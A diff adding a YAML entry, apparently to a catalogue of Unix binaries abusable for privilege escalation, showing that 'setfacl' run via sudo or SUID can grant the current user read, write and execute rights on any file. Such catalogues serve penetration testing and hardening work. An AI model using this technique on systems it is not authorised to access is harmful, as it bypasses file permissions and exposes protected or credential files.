@@ -1,0 +1,11 @@
+---
+functions:
+  privilege-escalation:
+  - code: |-
+      setfacl -m u:$(id -un):rwx /path/to/input-file
+    comment: |-
+      This can be run with elevated privileges to change ownership and then read, write, or execute a file.
+    contexts:
+      sudo:
+      suid:
+...
